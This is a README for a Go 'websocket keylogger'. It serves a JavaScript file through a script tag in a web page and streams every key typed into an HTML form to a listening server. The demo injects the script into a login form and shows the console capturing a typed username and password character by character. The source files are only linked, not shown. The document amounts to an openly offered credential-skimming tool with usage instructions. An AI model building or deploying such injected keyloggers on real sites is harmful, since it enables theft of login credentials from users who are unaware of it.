# Websocket keylogger

## What it is

this go tool is used to serve a Javascript websocket logger and also listens to it's inputs.

## How it works

The javascript in [logger.js](./logger.js) contains code that will connect to a websocket that is served by running the program defined in [main.go](./main.go). This program will then log all user input entered in a HTML form.

## Demo

For this demo, go to [https://jsbin.com](https://jsbin.com) and paste the following HTML into the editor window:

```html
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width">
  <title>Login</title>
</head>
<body>
    <script src='http://localhost:8080/k.js'>
    </script>
    <form action='/login' method='post'>
        <input name='username' />
        <input name='password' />
        <button type='submit' />
    </form>
</body>
</html>
```

the reference `http://localhost:8080/k.js` will load the Javascript code defined in [logger.js](./logger.js)

Now run the program like this:

```sh
go run main.go --listen-addr=127.0.0.1:8080 -ws-addr=127.0.0.1:8080
```

Now klick on `Run with JS` on your jsbin website and enter credentials, you should see all entered keys logged in the console output of the go program:

````
go run main.go --listen-addr=127.0.0.1:8080 -ws-addr=127.0.0.1:8080
Connection from 127.0.0.1:62762
From 127.0.0.1:62762: j
From 127.0.0.1:62762: o
From 127.0.0.1:62762: n
From 127.0.0.1:62762: a
From 127.0.0.1:62762: s
From 127.0.0.1:62762: Tab
From 127.0.0.1:62762: p
From 127.0.0.1:62762: @
From 127.0.0.1:62762: a
From 127.0.0.1:62762: s
From 127.0.0.1:62762: s
From 127.0.0.1:62762: w
From 127.0.0.1:62762: o
From 127.0.0.1:62762: r
From 127.0.0.1:62762: d
```